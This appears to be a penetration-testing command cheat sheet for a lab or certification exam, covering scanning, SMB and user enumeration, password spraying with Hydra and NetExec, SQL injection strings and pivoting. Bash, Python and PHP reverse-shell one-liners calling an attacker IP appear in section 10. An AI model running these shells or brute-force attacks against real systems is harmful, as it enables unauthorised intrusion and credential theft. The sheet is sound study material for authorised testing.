# Useful Commands

Extract Uploaded tools:
```bash
tar -xzvf tool-uploads.tgz
```

---

## 1. Host Discovery

### Ping sweep

```bash
fping -a -g <target-range> 2>/dev/null
```

```bash
nmap -sn <target-range>
```

### ARP discovery

```bash
arp-scan -l
```

```bash
netdiscover -r <target-range>
```

---

## 2. Port Scanning

### Quick TCP scan

```bash
nmap -sV -sC <target>
```

### Full TCP port scan

```bash
nmap -p- --min-rate 5000 -oN full-tcp.txt <target>
```

### Scan discovered ports in detail

```bash
nmap -sV -sC -p <ports> -oN detailed.txt <target>
```

### UDP top ports

```bash
nmap -sU --top-ports 100 <target>
```

### Aggressive scan

```bash
nmap -A <target>
```

---

## 3. DNS and Hostname Enumeration

### DNS lookup

```bash
nslookup <host>
```

```bash
dig <host>
```

### Reverse DNS lookup

```bash
dig -x <ip>
```

### Zone transfer test

```bash
dig axfr @<dns-server> <domain>
```

---

## 4. NetBIOS and SMB Enumeration

### NetBIOS scan

```bash
nbtscan <target-range>
```

```bash
nmblookup -A <ip>
```

### List SMB shares anonymously

```bash
smbclient -L //<ip> -N
```

### Connect to an SMB share

```bash
smbclient //<ip>/<share> -N
```

```bash
smbclient //<ip>/<share> -U <username>
```

### SMB enumeration

```bash
enum4linux-ng <ip>
```

```bash
smbmap -H <ip>
```

```bash
smbmap -H <ip> -u <username> -p <password>
```

### RPC anonymous login

```bash
rpcclient -U "" -N <ip>
```

Useful `rpcclient` commands:

```text
enumdomusers
enumdomgroups
querydominfo
srvinfo
netshareenumall
```

---

## 5. User Enumeration

### SMB user enumeration

```bash
enum4linux-ng <ip>
```

```bash
rpcclient -U "" -N <ip> -c "enumdomusers"
```

### SMTP user enumeration

```bash
smtp-user-enum -M VRFY -U <user-wordlist> -t <ip>
```

```bash
smtp-user-enum -M EXPN -U <user-wordlist> -t <ip>
```

### Kerberos user enumeration

```bash
kerbrute userenum -d <domain> <user-wordlist> --dc <dc-ip>
```

### Finger user enumeration

```bash
finger <username>@<ip>
```

---

## 6. Password Attacks

### Hydra SSH

```bash
hydra -L <user-list> -P <password-list> ssh://<ip>
```

### Hydra FTP

```bash
hydra -L <user-list> -P <password-list> ftp://<ip>
```

### Hydra HTTP POST form

```bash
hydra -L <user-list> -P <password-list> <ip> http-post-form "/<login-path>:<user-field>=^USER^&<pass-field>=^PASS^:<failure-message>"
```

### NetExec SMB password spray

```bash
netexec smb <ip> -u <user-list> -p <password-list>
```

```bash
netexec smb <ip> -u <username> -p <password> --shares
```

---

## 7. Web Enumeration

### Identify web technology

```bash
whatweb http://<ip>:<port>
```

```bash
curl -i http://<ip>:<port>
```

### Directory brute force with Gobuster

```bash
gobuster dir -u http://<ip>:<port> -w <wordlist>
```

### Directory brute force with FFUF

```bash
ffuf -u http://<ip>:<port>/FUZZ -w <wordlist>
```

### File extension fuzzing

```bash
ffuf -u http://<ip>:<port>/FUZZ -w <wordlist> -e .php,.txt,.html,.bak
```

### Check common web vulnerabilities

```bash
nikto -h http://<ip>:<port>
```

### View page source

```bash
curl http://<ip>:<port>
```

### Download a file

```bash
wget http://<ip>:<port>/<file>
```

```bash
curl -O http://<ip>:<port>/<file>
```

---

## 8. Web Login Testing

### Basic request inspection

```bash
curl -i http://<ip>:<port>/<login-path>
```

### Send POST request

```bash
curl -i -X POST http://<ip>:<port>/<login-path> \
  -d "<user-field>=<username>&<pass-field>=<password>"
```

### Include cookies

```bash
curl -i http://<ip>:<port>/<protected-path> \
  -H "Cookie: <cookie-name>=<cookie-value>"
```

### SQL injection quick tests

```text
'
"
' OR '1'='1
<username>'--
' OR 1=1--
```

### SQLMap basic usage

```bash
sqlmap -u "http://<ip>:<port>/<page>?<parameter>=<value>"
```

```bash
sqlmap -u "http://<ip>:<port>/<login-path>" --forms --batch
```

---

## 9. Exploit Research

### Search local Exploit-DB

```bash
searchsploit <service>
```

```bash
searchsploit <service> <version>
```

### Copy exploit locally

```bash
searchsploit -m <exploit-id>
```

### Start Metasploit

```bash
msfconsole
```

### Search in Metasploit

```text
search <service>
use <module>
show options
set RHOSTS <target>
set RPORT <port>
run
```

---

## 10. Reverse Shells

### Netcat listener

```bash
nc -lvnp <listen-port>
```

### Bash reverse shell

```bash
bash -i >& /dev/tcp/<your-ip>/<listen-port> 0>&1
```

### Python reverse shell

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<your-ip>",<listen-port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### PHP reverse shell one-liner

```bash
php -r '$sock=fsockopen("<your-ip>",<listen-port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 11. Shell Stabilisation

### Upgrade shell with Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press:

```text
Ctrl+Z
```

On your attacker machine:

```bash
stty raw -echo; fg
```

Then in the shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

---

## 12. File Searching

### Find files by name

```bash
find / -iname "*<keyword>*" 2>/dev/null
```

```bash
find / -iname "*<trophy-pattern>*" 2>/dev/null
```

```bash
find / -iname "*<secret-pattern>*" 2>/dev/null
```

### Search for trophy values

```bash
grep -R "<trophy-prefix>" / 2>/dev/null
```

```bash
grep -R "<trophy-prefix>" /home 2>/dev/null
```

### Search readable files

```bash
find / -type f -readable 2>/dev/null
```

### Search recently modified files

```bash
find / -type f -mtime -7 2>/dev/null
```

### Identify file type

```bash
file <filename>
```

### Extract readable strings

```bash
strings <filename>
```

---

## 13. Linux Privilege Enumeration

### Current user

```bash
whoami
id
hostname
```

### System info

```bash
uname -a
cat /etc/os-release
```

### Sudo permissions

```bash
sudo -l
```

### SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Writable directories

```bash
find / -writable -type d 2>/dev/null
```

### Interesting files

```bash
ls -la /home
ls -la /root
cat /etc/passwd
cat /etc/crontab
```

### Running processes

```bash
ps aux
```

### Listening ports

```bash
ss -tulpen
```

```bash
netstat -tulpen
```

---

## 14. Windows Enumeration

### Current user

```cmd
whoami
whoami /priv
whoami /groups
hostname
```

### System info

```cmd
systeminfo
```

### Users and groups

```cmd
net user
net localgroup
net localgroup administrators
```

### Network info

```cmd
ipconfig /all
route print
netstat -ano
```

### Search for files

```cmd
dir C:\*<keyword>* /s /b
```

```cmd
dir C:\*<trophy-pattern>* /s /b
```

```cmd
dir C:\*<secret-pattern>* /s /b
```

### Search inside files

```cmd
findstr /si "<search-string>" C:\*.txt
```

### PowerShell file search

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter "*<keyword>*"
```

```powershell
Select-String -Path C:\* -Pattern "<search-string>" -Recurse -ErrorAction SilentlyContinue
```

---

## 15. File Transfer

### Python HTTP server on attacker machine

```bash
python3 -m http.server <port>
```

### Download using wget

```bash
wget http://<your-ip>:<port>/<file>
```

### Download using curl

```bash
curl -O http://<your-ip>:<port>/<file>
```

### Download with PowerShell

```powershell
iwr http://<your-ip>:<port>/<file> -OutFile <file>
```

```powershell
Invoke-WebRequest http://<your-ip>:<port>/<file> -OutFile <file>
```

### Netcat file transfer

On receiving machine:

```bash
nc -lvnp <port> > <output-file>
```

On sending machine:

```bash
nc <target-ip> <port> < <input-file>
```

---

## 16. Routing

### Enumerate Network Configuration

```bash
ip -br addr                   # Interfaces and IP addresses
ip route                      # Current routing table
route -n                      # Legacy routing table
ip route get <IP>             # Show route/interface used to reach IP
```

### Add Static Routes

```bash
# Route to an entire network
sudo ip route add <NETWORK>/<CIDR> via <GATEWAY>

# Route to a single host (/32)
sudo ip route add <IP>/32 via <GATEWAY>

# Specify outgoing interface
sudo ip route add <NETWORK>/<CIDR> via <GATEWAY> dev eth0

# Directly connected network (no gateway)
sudo ip route add <NETWORK>/<CIDR> dev eth0

# Replace an existing route
sudo ip route replace <NETWORK>/<CIDR> via <GATEWAY>
```

**Note:** The gateway must normally be directly reachable. Use `ip -br addr` and `ip route` to identify the correct interface and gateway.

### Multi-Hop Routing (Gateway Behind Another Gateway)

If a new gateway is on an unreachable subnet, it may be reachable through an existing gateway.

**Example topology:**

```text
Kali (172.17.89.100)
    |
    v
Gateway 1 (172.17.89.254)
    |
    v
Gateway 2 (172.20.31.254)
    |
    v
Target (10.50.10.20)
```

```bash
# 1. Inspect existing routes
ip route
ip route get 172.20.31.254

# 2. Route to Gateway 2 through Gateway 1
sudo ip route add 172.20.31.254/32 via 172.17.89.254

# 3. Route the target through the directly reachable Gateway 1
sudo ip route add 10.50.10.20/32 via 172.17.89.254

# 4. Verify and test
ip route get 10.50.10.20
traceroute -n 10.50.10.20
nc -nvz -w 3 10.50.10.20 <PORT>
```

**Important:**
- Gateway 1 must know how to forward traffic towards Gateway 2 and the target.
- You generally only specify the **first reachable gateway** in your local routing table.
- Each intermediate router independently determines the next hop.
- Adding a route to Gateway 2 does not automatically make Gateway 2 the next hop for the target.
- If Gateway 1 lacks a route to the target, you may need to configure routing on Gateway 1 or use a tunnel/pivot.
- A valid local route does not guarantee that the return path exists.

### Verify & Troubleshoot

```bash
ip route get <IP>             # Confirm selected route
ping -c 3 <GATEWAY>           # Test gateway reachability
ping -c 3 <IP>                # Test destination (ICMP may be blocked)
traceroute -n <IP>            # Trace packet path
tracepath <IP>                # Alternative traceroute
nc -nvz -w 3 <IP> <PORT>      # Test TCP connectivity
nc -nv -w 5 <IP> <PORT>       # Connect and read service banner
```

### Delete Routes

```bash
sudo ip route del <NETWORK>/<CIDR>
sudo ip route del <IP>/32
```

### Example: Access a Service via a Router

**Target:** `172.20.31.10:23` via `172.17.89.254`

```bash
# 1. Check connectivity to gateway
ip -br addr
ip route
ping -c 2 172.17.89.254

# 2. Add host route
sudo ip route add 172.20.31.10/32 via 172.17.89.254

# 3. Verify routing
ip route get 172.20.31.10

# 4. Connect to Telnet and retrieve banner
nc -nv -w 5 172.20.31.10 23
telnet 172.20.31.10 23

# 5. Remove route
sudo ip route del 172.20.31.10/32
```

### Common Errors

| Error | Likely cause |
|---|---|
| `Nexthop has invalid gateway` | Gateway not directly reachable |
| `RTNETLINK answers: File exists` | Route already exists |
| `Network is unreachable` | Missing/incorrect route or interface |
| `Connection refused` | Service not listening or actively rejected |
| `Connection timed out` | Firewall, routing or return-path issue |

**Remember:**
- `/32` = single IPv4 host; `/24` = 256 IPv4 addresses.
- More specific routes take precedence (longest-prefix match).
- Static routes added using `ip route` are generally temporary.
- Ping failure does not necessarily indicate routing failure.
- Both forward and return paths must work for communication.
- In multi-hop routing, configure the route via the **first directly reachable gateway**.
- If the gateway is a pivot host, it must support forwarding/routing; a local static route alone is insufficient.

## 17. Telnet and Banner Grabbing

### Connect with Telnet

```bash
telnet <ip> <port>
```

### Connect with Netcat

```bash
nc -nv <ip> <port>
```

### Grab HTTP banner

```bash
curl -i http://<ip>:<port>
```

### Nmap banner script

```bash
nmap -sV --script=banner -p <port> <ip>
```

---

## 18. Pivoting and Proxying

### SSH local port forward

```bash
ssh -L <local-port>:<target-ip>:<target-port> <username>@<pivot-ip>
```

### SSH dynamic SOCKS proxy

```bash
ssh -D <socks-port> <username>@<pivot-ip>
```

### Use proxychains

```bash
proxychains nmap -sT -Pn <target>
```

```bash
proxychains curl http://<target>
```

### Chisel server on attacker

```bash
chisel server -p <port> --reverse
```

### Chisel client on target

```bash
chisel client <your-ip>:<port> R:socks
```

---

## 19. Wordlist Handling

### Sort and remove duplicates

```bash
sort <wordlist> | uniq > <output-file>
```

### Compare two files

```bash
comm -12 <(sort <file1>) <(sort <file2>)
```

### Grep exact matches between files

```bash
grep -Fxf <file1> <file2>
```

### Count lines

```bash
wc -l <wordlist>
```

### Extract usernames from enum output

```bash
grep -i "user" <enum-output-file>
```

---

## 20. Useful One-Liners

### Find likely trophy or secret files

```bash
find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
```

### Find trophy text

```bash
grep -R "<trophy-prefix>" / 2>/dev/null
```

### Scan then enumerate SMB

```bash
nmap -p 139,445 -sV -sC <ip> && enum4linux-ng <ip>
```

### Quick web enum

```bash
whatweb http://<ip>:<port> && gobuster dir -u http://<ip>:<port> -w <wordlist>
```

### Quick service check

```bash
nc -nv <ip> <port>
```

### Start listener

```bash
nc -lvnp <listen-port>
```

---

## 21. Common Wordlists

```text
/usr/share/wordlists/dirb/common.txt
```

```text
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
/usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```text
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

```text
/usr/share/wordlists/rockyou.txt.gz
```

Unzip RockYou:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## 22. Exam-Style Workflow

### 1. Discover

```bash
nmap -sn <target-range>
```

### 2. Scan

```bash
nmap -p- --min-rate 5000 <ip>
```

### 3. Enumerate

```bash
nmap -sV -sC -p <ports> <ip>
```

### 4. Research

```bash
searchsploit <service> <version>
```

### 5. Exploit

```bash
msfconsole
```

or use a manual exploit.

### 6. Search for trophy

```bash
find / -iname "*<trophy-pattern>*" -o -iname "*<secret-pattern>*" 2>/dev/null
grep -R "<trophy-prefix>" / 2>/dev/null
```

---

## 23. Notes

Always record:

```text
Target IP
Open ports
Service versions
Valid usernames
Credentials found
Interesting shares
Interesting web paths
Trophy location
Trophy value
```

Suggested folder layout:

```bash
mkdir -p ~/crt-lab/<target>/{scans,loot,exploits,notes}
```

Save scans:

```bash
nmap -sV -sC -oN scans/basic.txt <target>
```

---

## 24. Placeholder Reference

| Placeholder                    | Meaning                                          |
| ------------------------------ | ------------------------------------------------ |
| `<target>`                     | IP address, hostname, or range                   |
| `<ip>`                         | Single target IP address                         |
| `<target-range>`               | Network range, for example `<subnet>/<cidr>`     |
| `<host>`                       | Hostname                                         |
| `<domain>`                     | DNS, Windows, or Kerberos domain                 |
| `<username>`                   | Single username                                  |
| `<password>`                   | Single password                                  |
| `<user-list>`                  | File containing usernames                        |
| `<password-list>`              | File containing passwords                        |
| `<wordlist>`                   | Generic wordlist                                 |
| `<port>`                       | TCP or UDP port                                  |
| `<ports>`                      | Comma-separated port list                        |
| `<gateway-ip>`                 | Router or pivot gateway                          |
| `<destination-ip>`             | Target behind a route                            |
| `<destination-network>/<cidr>` | Destination subnet, for example `10.10.10.0/24`  |
| `<keyword>`                    | File, service, or challenge-specific search term |
| `<trophy-pattern>`             | Filename pattern for trophy files                |
| `<secret-pattern>`             | Filename pattern for secret files                |
| `<trophy-prefix>`              | Known text prefix for trophy values              |
| `<search-string>`              | Text to search for inside files                  |
| `<your-ip>`                    | Your attacker/VPN IP address                     |
| `<listen-port>`                | Port used by your listener                       |
| `<pivot-ip>`                   | Compromised host used as a route or proxy        |
| `<login-path>`                 | Web login endpoint                               |
| `<protected-path>`             | Authenticated web path                           |
| `<user-field>`                 | Login form username parameter                    |
| `<pass-field>`                 | Login form password parameter                    |
| `<failure-message>`            | Text shown when login fails                      |
